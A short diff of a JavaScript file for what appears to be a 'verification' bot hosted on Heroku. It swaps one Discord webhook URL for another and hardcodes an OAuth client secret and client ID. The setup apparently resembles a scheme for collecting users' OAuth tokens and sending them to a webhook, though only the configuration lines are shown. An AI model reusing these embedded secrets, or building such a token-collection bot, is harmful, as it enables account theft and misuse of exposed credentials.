@@ -2,7 +2,7 @@
 const client_secret = 'lEr8Q~IZ8eEOhvU6.U3Thk1kfAXg1t1fYA8kMb~~'
 const client_id = 'bf4a6eda-baa1-46da-80d6-a89070bbff6a'
 const redirect_uri = 'https://verificationbotmine.herokuapp.com/'
-const webhook_url = 'https://discord.com/api/webhooks/1040430111293448294/-D73OH8WYcY9cOTJntG0SaYv5BpkULN_5w_mOwRVujjatccM6rltg7Ih6Ly3kQysS5Z8'
+const webhook_url = 'https://discord.com/api/webhooks/1041482539749093500/uQMZ3PELOXwoiyHIp6LH5B2rkYG1bOVwiLm1lsC4dJsaoez3aAII1kgaEtAzeQaKVJCe'
 //Requirements
 const axios = require('axios')
 const express = require('express')
